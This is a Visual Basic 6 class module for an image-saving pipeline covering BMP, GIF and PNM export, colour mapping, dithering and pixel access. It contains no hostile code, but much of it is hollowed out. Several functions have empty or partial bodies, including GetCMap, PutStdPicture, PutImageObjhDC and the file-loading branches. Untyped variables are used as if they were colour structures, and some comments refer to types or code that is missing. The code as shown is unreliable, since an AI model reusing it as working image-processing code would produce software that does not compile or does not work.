Attribute VB_Name = "Class1"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit

'cRVTVBIMG.cls    - Image saving Pipeline Processing  - saves BMP,GIF and PNM

'- |fffd|2001/2003 Ron van Tilburg - All rights reserved  1.01.2001/Jun-Jul 2003
'- Amateur reuse is permitted subject to Copyright notices being retained and Credits to author being quoted.
'- Commercial use not permitted - email author please

'Jun/July 2003  Major Additions made
'=============================================================================================================
'================================== TYPES AND ENUMS ==========================================================
'=============================================================================================================

Public Enum IMG_PICTYPE 'PIC Save Type
  PIC_BMP = 0               'save as BMP
  PIC_GIF = 1               'save as GIF
  PIC_GIF_LACED = 2         'save as interlaced gif
  PIC_PNM = 3               'save as the most appropriate of PBM, PGM or PPM
  'others should be added here
End Enum

Public Enum IMG_COLORMODES
  PIC_COLOR = 0             'Color style  default
  PIC_BW = 1                'Just Black and White
  PIC_GREY = 2              'colours are converted eventually into greys (not necessarily unique)
End Enum

Public Enum IMG_DEPTHMODES       'Depth in Bits and the synonymous Number of colors
  PIC_1BPP = 1                    'GIF & BMP implies Black and White
  PIC_2BPP = 2                    'GIF 4 colors
  PIC_3BPP = 3                    'GIF 8 colors
  PIC_4BPP = 4                    'GIF 16 or BMP implies VGA 16 color palette
  PIC_5BPP = 5                    'GIF 32 colors
  PIC_6BPP = 6                    'GIF 64 colors
  PIC_7BPP = 7                    'GIF 128 colors
  PIC_8BPP = 8                    'GIF 256 or BMP
  PIC_9BPP = 9                    '  8 * 8 * 8 =     512
  PIC_12BPP = 12                  ' 16* 16* 16 =    4K
  PIC_15BPP = 15                  ' 32* 32* 32 =   32K
  PIC_16BPP = 16                  'BMP 32K 5b*5b*5b colour implicit in pixeldata  (no Grey Mode)
  PIC_24BPP = 24                  '256*256*256 =   16M BMP default  colour implicit in pixeldata  (no Grey Mode)
  PIC_32BPP = 32                  'BMP 16M 8b*8b*8b colour implicit in pixeldata  (no Grey Mode)

  'NColors in Bits
  PIC_C2 = 1                      'GIF & BMP implies Black and White
  PIC_C4 = 2                      'GIF 4 colors
  PIC_C8 = 3                      'GIF 8 colors
  PIC_C16 = 4                     'GIF 16 or BMP implies VGA 16 color palette
  PIC_C32 = 5                     'GIF 32 colors
  PIC_C64 = 6                     'GIF 64 colors
  PIC_C128 = 7                    'GIF 128 colors
  PIC_C256 = 8                    'GIF 256 or BMP implies Internet palette default
  
  PIC_C512 = 9                    'BMP          colour implicit in pixeldata  (no Grey Mode)
  PIC_C4K = 12                    'BMP          colour implicit in pixeldata  (no Grey Mode)
  PIC_C32K = 15                   'BMP          colour implicit in pixeldata  (no Grey Mode)
  PIC_C64K = 16                   'BMP          colour implicit in pixeldata  (no Grey Mode)
  PIC_C16M = 24                   'BMP default  colour implicit in pixeldata  (no Grey Mode)
  PIC_C16M32 = 32                 'BMP          colour implicit in pixeldata  (no Grey Mode)
End Enum

Public Enum IMG_CMAPMODES         'CMAP Actions *see also mValidate.bas for the Internal version of these
           PIC_MS_CMAP = &H2100&  'Just use the Cmap passed on from GDI or REMAP using MS API
      PIC_OPTIMAL_CMAP = &H1000&  'Make an optimal palette to correspond with BPP (use 24bits to n bits)
        PIC_IntED_CMAP = &H2000&  'Use a nColor Inted Color map
    PIC_IntED_CMAP_VGA = &H200A&  'Force the VGA Colormap
   PIC_IntED_CMAP_INET = &H200B&  'Force the 216 InternetSafe colormap (6*6*6)
  PIC_IntED_CMAP_MS256 = &H200D&  'Force the MS  256 colormap (8,8,4)
   PIC_IntED_CMAP_GREY = &H2200&  'Use a nColor Grey map              (IntED + GREY)
     PIC_MODIFIED_CMAP = &H3000&  'Use a Modified nColor Color map  (OPTIMAL + IntED)
   PIC_IntED_CMAP_USER = &H6000&  'Use a user supplied nColorMap      (IntED + USER)  (see SetCustomCmap())
End Enum

Public Enum IMG_DITHERMODES 'DITHER Actions
  PIC_DITHER_NONE = 0
  PIC_DITHER_BIN = &H1&          'Dither in a binary method
  PIC_DITHER_ORD = &H2&          'Dither to an ordered dithermatrix (default)
  PIC_DITHER_HTC = &H4&          'Dither to a printer Halftone
  PIC_DITHER_FDIAG = &H8&        'Dither to an forward diagonal dithermatrix
  PIC_DITHER_BDIAG = &H10&       'Dither to an backward diagonal dithermatrix
  PIC_DITHER_HORZ = &H20&        'Dither to an horizontal dithermatrix
  PIC_DITHER_VERT = &H40&        'Dither to an vertical dithermatrix
                                 'FS1,2,3 are retained for continuity - the matrices though have changed
  PIC_DITHER_FS1 = &H100&        'Serpentine Error Diffusion dithering Ulichney-Floyd-Steinberg Matrix
  PIC_DITHER_FS2 = &H200&        'Serpentine Error Diffusion dithering RVT 4 Inted coefficients
  PIC_DITHER_FS3 = &H400&        'Serpentine Error Diffusion dithering Ostromoukhov 3 Variable Coefficients
  PIC_DITHER_SED1 = &H100&       'Serpentine Error Diffusion dithering Floyd-Steinberg Matrix
  PIC_DITHER_SED2 = &H200&       'Serpentine Error Diffusion dithering RVT 4 Inted coefficients
  PIC_DITHER_SED3 = &H400&       'Serpentine Error Diffusion dithering Ostromoukhov 3 Variable Coefficients
  
  PIC_DITHER_BNM = &H800&        'Blue Noise Mask ( my algorithm, reasonable approximation so far)
End Enum

Public Enum IMG_PICPROC_COMMANDS  'These Codes are not actually used by external calls
  'The constants here have the form
  'BYTE 3 special control codes, BYTE 2 API OpCodes, BYTE 1 Command Nr, BYTE 0 The number of parameters it uses
  '00 = Ignored
  '01 = APIAssisted
  '02 = Requires      24/32bpp (so unmap if necessary)
  '04 = Requires   16/24/32bpp (so unmap if necessary)
  '08 = Requires 8/16/24/32bpp (so unmap if necessary)
  '10 = IMAGE OPERATION
  '20 = COLOR OPERATION
  '40 = TWO IMAGE OPERATION
  '80 DO NOT USE

  'Image Operations
          PIC_FLIP_VERT = &H10000100 'flip image vertically
          PIC_FLIP_HORZ = &H10000200 'flip image horizontally
        PIC_ROTATE_LEFT = &H18000300 'Rotate 90deg CCW
       PIC_ROTATE_RIGHT = &H18000400 'Rotate 90deg CW
         PIC_ROTATE_180 = &H10000500 'Rotate 180deg :-)
       PIC_CLIP_CENTRED = &H18000602 'Clip image to Centre ie to parms Long New Width,Height
            PIC_EXTRACT = &H18000704 'Extract a new Image from an Image - at parm1=x,parm2=y,parm3=Width,p4=Height
               PIC_TRIM = &H18000804 'Clip Image by removing Top,Left,Bottom,Right pixels
              PIC_FRAME = &H18000903 'Frame Image by replacing LeftRight,TopBottom pixels with FrameRGBColor
             PIC_RESIZE = &H18000A02 'Integer Resize to parm1=NewWidth, parm2=NewHeight
               PIC_ZOOM = &H18000B02 'Integer Zoom image by parm1 Single=XZoom times,parm2 Single=YZoom Times
                                     'if 0<xzoom,yzoom<1 then shrink,>1 enlarge
    PIC_BILINEAR_RESIZE = &H12000C02 'Resize by Bilinear Resampling to parm1=NewWidth, parm2=NewHeight
      PIC_BILINEAR_ZOOM = &H12000D02 'Zoom image Bilinear Resampling by parm1single =XZoom times,parm2 single=YZoom Times
                                     'if 0<xzoom,yzoom<1 then shrink,>1 enlarge
            PIC_SHARPEN = &H18000E01 'Sharpen Image by Factor 1-9
               PIC_BLUR = &H18000F01 'Blur Image    by Factor 1-9
             PIC_DEJPEG = &H18001001 'Remove JPEG block artifacts by factor 1-4
             PIC_EMBOSS = &H18001101 'Emboss Image  by Factor 1-9
               PIC_EDGE = &H18001201 'Show Edges    by Factor 1-9
           PIC_HARDEDGE = &H18001302 'Edge and Threshold Edges Factor 1-9 and Threshold 0-255
  
  'Color Operations
        PIC_UNMAP_COLOR = &H20000101 'Unmap image (to 24BPP) if mapped, (and remap afterwards)
        PIC_MSMAP_COLOR = &H20000202 'Parm1 = BPP required only 1,4,8,16,24,32 allowed
       PIC_INVERT_COLOR = &H20000300 'Invert all colors 00=FF etc
         PIC_MASK_COLOR = &H20000401 'Mask all Values to Parm1=RGBColor components
     PIC_SEPARATE_COLOR = &H20000501 'Leave a separation of colours like parm1=RGBColor
     PIC_EQUALIZE_COLOR = &H28000600 'Attempt to Equalise Colors
    PIC_THRESHOLD_COLOR = &H20000701 'Threshold Image to RGBColor Value if > then value
      PIC_GAMMA_CORRECT = &H20000803 'Gamma Correct Image three Parameters All Single RGamma,GGamma,BGamma
 PIC_BRIGHTNESS_CORRECT = &H20000903 'Brightness Correct Image three Parameters All Single RFactor,GFactor,BFactor
   PIC_ALPHABLEND_COLOR = &H20000A02 'AlphaBlend a parm1=RGBcolor by factor Alpha Parm1 single 0.0-1.0
      PIC_COMBINE_COLOR = &H20000B01 'Combine With parm1=RGBColor,given Opcode=Parm2
      PIC_REPLACE_COLOR = &H20000C03 'Replace parm1=TargetRGBColor,parm2=radius,parm3=NewRGBColor
  
  'Two Image operations
             PIC_SPLICE = &H40000102 'Parm1 = 2nd Image, Parm2=WhichEdge
            PIC_OVERLAY = &H40000303 'Overlay Parm1=2nd Image onto Image - at parm2=x,parm3=y
   PIC_ALPHABLEND_IMAGE = &H40000402 'AlphaBlend two Images, parm2 Single=Factor Alpha
      PIC_COMBINE_IMAGE = &H40000502 'Combine parm1=Image - With given Opcode=Parm2
          
  'new commands (and their VB code)
End Enum

'When combining Color Components which range 0..255, according to Result = Pixel1 Opcode Pixel2
Public Enum PIC_COMBINATION_OPCODES
    
   PCC_COPY = 0     'r = P2
  PCC_BLACK = 1     'r = &H00
  PCC_WHITE = 2     'r = &HFF
    PCC_ALT = 3     'r = if P1>127 then P1 else P2
    
    PCC_ADD = 4     'r = MIN( P1+P2, 255)
    PCC_SUB = 5     'r = MAX( P1-P2,   0)
    
    PCC_MOD = 6     'r = MIN(   (P1.P2)\255, 255)
   PCC_MOD2 = 7     'r = MIN( (2.P1.P2)\255, 255)
   PCC_ADDM = 8     'r = MAX(MIN( P1 + P2 - P1.P2\255, 255), 0) 'Add Smooth
    
    PCC_AND = 9     'r = P1 AND P2
     PCC_OR = 10    'r = P1  OR P2
    PCC_XOR = 11    'r = P1 XOR P2
  
    PCC_MAX = 12    'r = MAX(P1,P2)
    PCC_MIN = 13    'r = MIN(P1,P2)
    PCC_AVE = 14    'r = (P1+P2)\2  === alphablend with factor 1/2
    
    PCC_DOT = 15    'r = SQR((P1*P1 + P2*P2)\2)
  
  'Parameters and result may be affected by ORing in these codes
   PCC_NOT1 = 16    'P1 = NOT P1
   PCC_NOT2 = 32    'P2 = NOT P2
   PCC_NOTR = 64    'r  = NOT r
End Enum

Public Enum PIC_SEPARATION_OPCODES
  PSC_BLACK = 128 + 0  'Max(not r,not g,not b)
  PSC_RED = 128 + 1    'G=B=0
  PSC_GREEN = 128 + 2  'R=B=0
  PSC_BLUE = 128 + 4   'R=G=0
  PSC_YELLOW = 128 + 3 'B=0
  PSC_MAGENTA = 128 + 5 'G=0
  PSC_CYAN = 128 + 6   'R=0
End Enum

Public Enum PIC_JOIN_EDGES
  PJE_LEFT = 1
  PJE_TOP = 2
  PJE_RIGHT = 3
  PJE_BOTTOM = 4
End Enum

Public Enum IMG_RENDEROPTIONS  '(additive bitstates 4,8,16)
  IRO_ASIS = 0                   'Put at CurrXY, and Without scaling
  IRO_STRETCH = 1                'Stretch to Fit Clip Area (ie AutoCentred)
  IRO_TILE = 2                   'Tile Image to Fit Clip Area (image is not Scaled)

  IRO_KEEPASPECT = 4             'Image Aspect Ratio is Kept during Stretch (wont necessarily fit to edges)
  IRO_INTSCALE = 8               'Image is scaled by nearest integer to StretchFit (wont necessarily fit to edges)
  IRO_CENTRE = 16                'Image is put in the centre of the clip
End Enum

    'all values 0..255  'This is a synonym of PALETTENTRY


'Internally Used
Public Enum IMG_PICSTATES      'additive bitstates (read only)
  IS_VALID_PIPELINE = &H1&
  IS_VALID_CLIP = &H2&           'the clipping rectangle is inside the image
  IS_CMAPPED = &H4&              'Colormapping has taken place (all pixels are 1,4 or 8bit indices to CMap)
  IS_TOP_TO_BOTTOM = &H8&        'the image is topdown oriented, not bottom up as a BMP usually is
  IS_MS_FORMAT = &H10&           'the current result image is Mapped 1,4,8 or 16,24,32 bits
End Enum

'=============================================================================================================
'============================= THE BASIC ELEMENTS OF THE IMAGE ================================================
'=============================================================================================================

Private zPicState     As Long         'see enum above
Private zWidth        As Long         'in pixels
Private zHeight       As Long         'in pixels
Private zRowModulo    As Long         'in Bytes
Private zPixBits()    As Byte         'the array of pixel bits, may be indices into the CMap
Private zIntBPP       As Long         'The Internal BitsPerPixel (1,4,8,16,24 for BMPS, =24 for GIF,JPG,PNM)
Private zNCMapColors  As Long         'The number of Colors in the CMap, 2^BitsPerPixel

                                      'your problem is to make it the right size

Private zPicType      As Long         'BMP or GIF
Private zColorMode    As Long         'COLOR, BW, GREY
Private zReqBPP       As Long         'The requested format in Bits Per Pixel
Private zCMAPMode     As Long         'See Enum above
Private zDitherMode   As Long         'See Enum Above
Private zTransparentC As Long         'The Transparent color in GIFs (if in final GIF)
                
'for DemoPurposes Only
Private zTimer        As cTimingPC

'Elapsed times in seconds
Public etLoad         As Single    'Time To Load/Capture
Public etOps          As Single    'Time Operations
Public etQuant        As Single    'Time Quantize colors
Public etRemap        As Single    'Time Remap/Dither
Public etSave         As Single    'Time To Save Files
Public etElapsed      As Single    'Total Time (for Major Functions)

'=============================================================================================================
'=================================== INIT/TERMINATE ==========================================================
'=============================================================================================================

Private Sub Class_Initialize()
  
  Set zTimer = New cTimingPC
  zTimer.Reset
  Call InitValidationArrays     'mValidate.bas
  Call InitBMPScales            'mBBMFileIO.bas
  zIntBPP = PIC_24BPP
  zReqBPP = PIC_24BPP
  zPicState = IS_VALID_PIPELINE
  
End Sub

Private Sub Class_Terminate()
  
  Set zTimer = Nothing
  
End Sub

'=============================================================================================================
'=============================== PROPERTIES ===================================================================
'=============================================================================================================

Public Property Get Width() As Long
  
  Width = zWidth

End Property

Public Property Get Height() As Long
  
  Height = zHeight

End Property

Public Property Get BitsPerPixel() As Long
  
  BitsPerPixel = zIntBPP
  
End Property

Public Property Get ReqBPP() As Long
  
  ReqBPP = zReqBPP
  
End Property

'DstPixBits should be dynamically allocated
Public Function GetPixBits(ByRef DstPixBits() As Byte) As Boolean

  On Error Resume Next
  DstPixBits() = zPixBits()
  If Err.Number = 0 Then GetPixBits = True
  On Error GoTo 0

End Function

Friend Property Get PixBitsBasePtr() As Long    'return the BaseAddress of the zPixBits() Array

  PixBitsBasePtr = VarPtr(zPixBits(0))

End Property

Public Property Get RowModulo() As Long
  
  RowModulo = BMPRowModulo(zWidth, zIntBPP)

End Property

'DstCMap should be dynamically allocated
Public Function GetCMap() As Boolean

  On Error Resume Next
  If Err.Number = 0 Then GetCMap = True
  On Error GoTo 0

End Function

Public Property Get NCMapColors() As Long
  
  NCMapColors = zNCMapColors

End Property

'set aside a user prepared colormap - it should match NCMapColors (users responsibility to check)
Public Property Let UserCMap(ByRef UserCMap)

  On Error Resume Next
  On Error GoTo 0

End Property

'These are internally maintained
Public Property Get PicState() As IMG_PICSTATES
  
  PicState = zPicState

End Property

Public Property Get PicType() As IMG_PICTYPE
  
  PicType = zPicType

End Property

Public Property Get ColorMode() As IMG_COLORMODES
  
  ColorMode = zColorMode

End Property

Public Property Get CMAPMode() As IMG_CMAPMODES
  
  CMAPMode = zCMAPMode

End Property

Public Property Get DitherMode() As IMG_DITHERMODES
  
  DitherMode = zDitherMode

End Property

'Set this property to make a GIF transparent , set it with -1 to stop this happening
Public Property Let TransparentGIFColor(ByVal vdata As Long)

  If vdata = -1 Then
    zTransparentC = -1
   Else
    zTransparentC = (vdata And &HFFFFFF)
  End If

End Property

Public Property Get TransparentGIFColor() As Long

  TransparentGIFColor = zTransparentC

End Property

'=============================================================================================================
'======================================= M E T H O D S =======================================================
'=============================================================================================================
'Make a complete copy of an image
Public Function Clone() As cRVTVBIMG    'Nothing if Failed to Copy
  
  Set Clone = New cRVTVBIMG
  If Not Clone.CloneFrom(Me) Then Set Clone = Nothing
  
End Function

'As an Image is strictly ReadOnly apart from sanctioned methods so we clone From the Original here
Friend Function CloneFrom(ByVal RefImage As cRVTVBIMG) As Boolean
  
  With RefImage
    zPicState = .PicState
    zWidth = .Width
    zHeight = .Height
    zIntBPP = .BitsPerPixel
    CloneFrom = .GetPixBits(zPixBits())
    zNCMapColors = .NCMapColors
    zPicType = .PicType
    zColorMode = .ColorMode
    zReqBPP = .ReqBPP
    zCMAPMode = .CMAPMode
    zDitherMode = .DitherMode
    zTransparentC = .TransparentGIFColor
  End With
  
End Function

'Make a cleared Image, optionally of a different size, always cleared to Black
Public Function EraseImage(Optional ByVal NewWidth As Long = 0, _
                           Optional ByVal NewHeight As Long = 0, _
                           Optional ByVal NewBPP As Long = 0) As Boolean

  Call SetF(zPicState, IS_VALID_PIPELINE Or IS_TOP_TO_BOTTOM)
  NewWidth = Abs(NewWidth)
  NewHeight = Abs(NewHeight)
  If NewWidth = 0 Then NewWidth = zWidth
  If NewHeight = 0 Then NewHeight = zHeight
  If NewWidth = 0 Then NewWidth = 256
  If NewHeight = 0 Then NewHeight = 256
  zWidth = NewWidth
  zHeight = NewHeight
  If NewBPP <= PIC_24BPP Then
    zIntBPP = PIC_24BPP
  Else
    zIntBPP = NewBPP
  End If
  ReDim zPixBits(0 To zHeight * BMPRowModulo(zWidth, zIntBPP) - 1)
  If zReqBPP = 0 Then zReqBPP = PIC_24BPP
  zNCMapColors = 0
  EraseImage = True
  
End Function

'Return a Pixel at Offset from PixBits (NOTE: NO ERROR CHECKING HERE AT ALL)
Friend Function GetPixelz()
  
  Dim w As Long, Pixel
  
  Select Case zIntBPP
    Case PIC_8BPP:
      
    Case PIC_24BPP:
      With GetPixelz
      End With
      
    Case PIC_32BPP:
      With GetPixelz

      End With
      
    Case PIC_16BPP:   '5,5,5
      With GetPixelz
        .Blue = BMP31Scale((w And &H1F&))
        .Green = BMP31Scale((w And &H3E0&) \ 32&)
        .Red = BMP31Scale((w And &H7C00&) \ 1024&)
      End With
  End Select
    
End Function

'get the value of a pixel as a VBColor ie Long as &HAABBGGRR
Public Function GetPixel(ByVal x As Long, ByVal y As Long) As Long    '-1 is outside image
  
  Dim p As Long, cc
  
  GetPixel = -1
  If zIntBPP >= PIC_16BPP Then                       'is not mapped
    If x >= 0 And x < zWidth Then                                 'x in range
      If y >= 0 And y < zHeight Then                              'y in range
        p = y * BMPRowModulo(zWidth, zIntBPP) + x * (zIntBPP \ 8)
        Select Case zIntBPP
          Case PIC_24BPP:
            cc.Blue = zPixBits(p)
            cc.Green = zPixBits(p + 1)
            cc.Red = zPixBits(p + 2)
          
          Case PIC_32BPP:
            cc.Blue = zPixBits(p)
            cc.Green = zPixBits(p + 1)
            cc.Red = zPixBits(p + 2)
            cc.Alpha = zPixBits(p + 3)
            
          Case PIC_16BPP:
        
        End Select
        GetPixel = PutRGBA(cc)
      End If
    End If
  Else        'its a mapped image
    p = GetPixelIndex(x, y)         'get index
    If p <> -1 Then
    End If
  End If
  
End Function

'set the value of a pixel if image is not mapped -1 is returned
Public Function SetPixel(ByVal x As Long, ByVal y As Long, ByVal RGBColor As Long) As Long '-1 is outside image
  
  Dim p As Long, cc
  
  SetPixel = -1
  If zIntBPP >= PIC_16BPP Then                       'is not mapped
    If x >= 0 And x < zWidth Then                             'x in range
      If y >= 0 And y < zHeight Then                          'y in range
        cc = GetRGBA(RGBColor)
        p = y * BMPRowModulo(zWidth, zIntBPP) + x * (zIntBPP \ 8)
        Select Case zIntBPP
          Case PIC_24BPP:
            zPixBits(p) = cc.Blue
            zPixBits(p + 1) = cc.Green
            zPixBits(p + 2) = cc.Red
          
          Case PIC_32BPP:
            zPixBits(p) = cc.Blue
            zPixBits(p + 1) = cc.Green
            zPixBits(p + 2) = cc.Red
            zPixBits(p + 3) = cc.Alpha
            
          Case PIC_16BPP:
        
        End Select
        SetPixel = RGBColor
      End If
    End If
  End If
  
End Function

'get the value of a pixel index for Mapped Images
Public Function GetPixelIndex(ByVal x As Long, ByVal y As Long) As Long    '-1 is outside image
  
  Dim p As Long, q As Long
  
  GetPixelIndex = -1
  If zIntBPP <= PIC_8BPP Then                       'is mapped
    If x >= 0 And x < zWidth Then                             'x in range
      If y >= 0 And y < zHeight Then                          'y in range
        p = y * BMPRowModulo(zWidth, zIntBPP)
        Select Case zIntBPP
          Case PIC_8BPP:
            GetPixelIndex = zPixBits(p + x)
            
          Case PIC_4BPP:
            If (x And 1) = 1 Then
              GetPixelIndex = (zPixBits(p + x \ 2) And &HF)
            Else
              GetPixelIndex = (zPixBits(p + x \ 2) And &HF0) \ 16
            End If
          
          Case PIC_1BPP:
            If (CLng(zPixBits(p + x \ 8)) And (Not 2 ^ CLng(7 - x Mod 8))) = 0 Then
              GetPixelIndex = 0
            Else
              GetPixelIndex = 1
            End If
        End Select
      End If
    End If
  End If
  
End Function

'set the value of a pixel by its color Index if Image is not mapped -1 is returned
Public Function SetPixelIndex(ByVal x As Long, ByVal y As Long, ByVal ColorIndex As Long) As Long '-1 is outside image
  
  Dim p As Long, q As Long
  
  SetPixelIndex = -1
  If zIntBPP <= PIC_8BPP Then                       'is mapped
    If x >= 0 And x < zWidth Then                             'x in range
      If y >= 0 And y < zHeight Then                          'y in range
        If ColorIndex >= 0 And ColorIndex < NCMapColors Then  'colorindex in range
          p = y * BMPRowModulo(zWidth, zIntBPP)
          Select Case zIntBPP
            Case PIC_8BPP:
              zPixBits(p + x) = ColorIndex
              
            Case PIC_4BPP:
              If (x And 1) = 1 Then
                zPixBits(p + x \ 2) = (zPixBits(p + x \ 2) And &HF0) Or ColorIndex
              Else
                zPixBits(p + x \ 2) = (zPixBits(p + x \ 2) And &HF) Or (ColorIndex * 16)
              End If
            
            Case PIC_1BPP:
              q = 2 ^ (7 - x Mod 8)
              If ColorIndex = 1 Then
                q = (zPixBits(p + x \ 8) And (Not q)) Or q
              Else
                q = (zPixBits(p + x \ 8) And (Not q))
              End If
              zPixBits(p + x \ 8) = (q And &HFF)
          End Select
          SetPixelIndex = ColorIndex
        End If
      End If
    End If
  End If
  
End Function

'----------------------------- Passing Complete Image data between You and Me --------------------------------

'Takes a filled in BM and Captures it Internally
'It is the callers responsibility to divest itself of hUserBM
'This may fail for lack of memory - always captured as 24BPP
Public Function PutImageBitMap(ByVal hUserBM As Long) As Boolean     'TRUE if Filled in correctly
  
  
  If hUserBM <> 0 Then
    zIntBPP = 24
  End If
  
End Function

'Clones the Internal Image (if it is a valid MS Format) and returns it in a pointer
'It is the callers responsibility to divest itself of hUserBM
'This may fail for lack of memory - a 5,6,5 16bit bitmap cannot be made, all others OK
Public Function GetImageBitMap(ByRef hUserBM As Long) As Boolean
  
  Dim tmpDC As Long
  
  If tmpDC <> 0 Then Call DeleteObject(tmpDC)

End Function

'------------------------------ Data to and From StdPicture --------------------------------------------------

'Creates an Image from the Passed in StdPicture
Public Function PutStdPicture(ByRef Pic As StdPicture) As Boolean
  

End Function

'Returns a StdPicture from the Internal Image  (based on Original Code by Vlad Vissoultchev.)
Public Function GetStdPicture() As StdPicture   'Nothing if it Failed
 
 Dim sp As StdPicture, PicDesc As PictDesc, IID_IDispatch As GUID
 Dim tmpDC As Long, tmpBM As Long, OldSMode As Long

    '-- Fill image info
    With PicDesc
      .Size = Len(PicDesc)
      .Type = vbPicTypeBitmap
      .hBmp = tmpBM
      .hPal = 0
    End With
    
    '-- Fill GUID info
    With IID_IDispatch
      .Data1 = &H20400
      .Data4(0) = &HC0
      .Data4(7) = &H46
    End With
    
    '-- Create picture from bitmap handle
    Call OleCreatePictureIndirect(PicDesc, IID_IDispatch, 1, sp)
    Set GetStdPicture = sp
      
    '-- Cleanup
    Call FreeDCandBitmap(tmpDC, tmpBM)
  
  
End Function

'------------------------------ Data to and From an Obj.hDC --------------------------------------------------

'Capture an Image From an Obj.hDC

Public Function GetImageObjhDC(ByVal Obj As Object, _
                               Optional ByVal ClipLeft As Long = -1, _
                               Optional ByVal ClipTop As Long = -1, _
                               Optional ByVal ClipRight As Long = -1, _
                               Optional ByVal ClipBottom As Long = -1) As Boolean


  If FSet(zPicState, IS_VALID_PIPELINE) Then       'must have a valid pipeline to proceed
  End If

End Function

'Render the Image Stored to a given Obj.hDC [clipped]
Public Function PutImageObjhDC(ByVal Obj As Object, _
                               Optional ByVal ImageRenderOptions As IMG_RENDEROPTIONS = IRO_ASIS, _
                               Optional ByVal ClipLeft As Long = -1, _
                               Optional ByVal ClipTop As Long = -1, _
                               Optional ByVal ClipRight As Long = -1, _
                               Optional ByVal ClipBottom As Long = -1) As Boolean

End Function

'AUTOPILOT Render the Image Stored to a given DC (clipped and centred)
Public Function DisplayImage(ByVal Obj As Object) As Boolean

  DisplayImage = PutImageObjhDC(Obj)

End Function

'AUTOPILOT OBJ.hDC SAVE
' The whole or part of an Object hDC will be saved according to your passed-in preferences
' The simplest possible call is
'    SaveObjDCCLip(Obj,Path) which saves the whole Obj.hDC as a 256Color Bitmap to Path
'  a return code of false indicates something went wrong.

Public Function SaveObjDCClip(ByVal Obj As Object, _
                              ByRef DestPath As String, _
                              Optional ByVal PicType As IMG_PICTYPE = PIC_BMP, _
                              Optional ByVal ColorMode As IMG_COLORMODES = PIC_COLOR, _
                              Optional ByVal BitsPerPixel As IMG_DEPTHMODES = PIC_8BPP, _
                              Optional ByVal CMAPMode As IMG_CMAPMODES = PIC_OPTIMAL_CMAP, _
                              Optional ByVal DitherMode As IMG_DITHERMODES = PIC_DITHER_NONE, _
                              Optional ByVal ClipLeft As Long = -1, _
                              Optional ByVal ClipTop As Long = -1, _
                              Optional ByVal ClipRight As Long = -1, _
                              Optional ByVal ClipBottom As Long = -1) As Boolean

  etElapsed = zTimer.Elapsed
  If Not Obj Is Nothing Then
    If Len(DestPath) <> 0 Then
      If SetPipeline(PicType, ColorMode, BitsPerPixel, CMAPMode, DitherMode) Then  'set the pipeline
        If GetImageObjhDC(Obj, ClipLeft, ClipTop, ClipRight, ClipBottom) Then      'get the basic image data
          If DoColorMapping() Then                                                 'Post Processing
            SaveObjDCClip = CommitToDisk(DestPath, PicType)                        'File IO
          End If
        End If
      End If
    End If
  End If
  etElapsed = zTimer.Elapsed - etElapsed
  
End Function

'----------------------------- Data to and From Disk Files -----------------------------------------------------

Public Function LoadFromFile(ByRef FilePath As String) As Boolean

  Dim tmpPic As StdPicture
  
  etLoad = zTimer.Elapsed
  If Len(FilePath) <> 0 Then
  
    'Try BMP
    
    If Not LoadFromFile Then  'Try PNM
    End If
        
    If Not LoadFromFile Then  'use emergency measures  (StdPic) GIF,JPG,JPEG
      On Error Resume Next
      Set tmpPic = LoadPicture(FilePath)
      On Error GoTo 0
      If Not tmpPic Is Nothing Then LoadFromFile = PutStdPicture(tmpPic)
    End If
  End If
    
  etLoad = zTimer.Elapsed - etLoad

End Function

'This function is a one step save routine, Current Image must be already loaded
Public Function SavetoFile(ByRef DestPath As String, _
                           Optional ByVal PicType As IMG_PICTYPE = PIC_BMP, _
                           Optional ByVal ColorMode As IMG_COLORMODES = PIC_COLOR, _
                           Optional ByVal BitsPerPixel As IMG_DEPTHMODES = PIC_8BPP, _
                           Optional ByVal CMAPMode As IMG_CMAPMODES = PIC_OPTIMAL_CMAP, _
                           Optional ByVal DitherMode As IMG_DITHERMODES = PIC_DITHER_NONE) As Boolean '(true is Good)

  etLoad = 0
  etElapsed = zTimer.Elapsed
  If Len(DestPath) <> 0 Then
    If SetPipeline(PicType, ColorMode, BitsPerPixel, CMAPMode, DitherMode) Then ' Set the pipeline
      If DoColorMapping() Then                                                  ' Post Processing
        SavetoFile = CommitToDisk(DestPath, PicType)                                  ' File IO
      End If
    End If
  End If
  etElapsed = zTimer.Elapsed - etElapsed

End Function

'This function is a BMP,GIF,JPG,PNM one step conversion routine
'Load the Image and Save it again (with requested parms)
Public Function ConvertImageFile(ByRef SourcePath As String, _
                                 ByRef DestPath As String, _
                                 Optional ByVal PicType As IMG_PICTYPE = PIC_BMP, _
                                 Optional ByVal ColorMode As IMG_COLORMODES = PIC_COLOR, _
                                 Optional ByVal BitsPerPixel As IMG_DEPTHMODES = PIC_8BPP, _
                                 Optional ByVal CMAPMode As IMG_CMAPMODES = PIC_OPTIMAL_CMAP, _
                                 Optional ByVal DitherMode As IMG_DITHERMODES = PIC_DITHER_NONE) As Boolean

  etElapsed = zTimer.Elapsed
  If Len(SourcePath) <> 0 And Len(DestPath) <> 0 Then
    If SetPipeline(PicType, ColorMode, BitsPerPixel, CMAPMode, DitherMode) Then    'Set the pipeline
      If LoadFromFile(SourcePath) Then                  ' Get The Image we want To Convert Must be a valid image
        If DoColorMapping() Then                        ' Post Processing
          ConvertImageFile = CommitToDisk(DestPath, PicType)  ' File IO
        End If
      End If
    End If
  End If
  etElapsed = zTimer.Elapsed - etElapsed
End Function

'==================================================================================================================
'HERE FOLLOW the individual steps of the Pipeline as applied by the SaveOBJDCCLip
'SetPipeline should always be called BEFORE capture of individual items
'==================================================================================================================
'Just calling this will give you a pipeline of PIC_BMP,PIC_COLOR,PIC_8BPP,PIC_OPTIMAL_CMAP,PIC_DITHER_NONE
Public Function SetPipeline(Optional ByVal PicType As IMG_PICTYPE = PIC_BMP, _
                            Optional ByVal ColorMode As IMG_COLORMODES = PIC_COLOR, _
                            Optional ByVal BitsPerPixel As IMG_DEPTHMODES = PIC_8BPP, _
                            Optional ByVal CMAPMode As IMG_CMAPMODES = PIC_OPTIMAL_CMAP, _
                            Optional ByVal DitherMode As IMG_DITHERMODES = PIC_DITHER_NONE) As Boolean

  SetPipeline = QualifyPipeline(PicType, ColorMode, BitsPerPixel, CMAPMode, DitherMode)

End Function

